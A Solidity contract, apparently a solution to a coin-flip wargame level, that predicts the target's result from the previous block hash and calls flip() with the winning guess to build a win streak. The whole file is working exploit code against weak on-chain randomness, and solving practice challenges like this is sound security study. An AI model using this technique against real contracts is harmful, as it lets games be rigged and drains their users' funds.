// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinAttack {
    address coinFlipAddr;
    uint256 public winStreak;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlipAddr) {
        coinFlipAddr = _coinFlipAddr;
    }

    function hack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        (bool success, ) = coinFlipAddr.call(
            abi.encodeWithSignature("flip(bool)", side)
        );
        require(success, "Tx failed");
        winStreak++;
    }
}
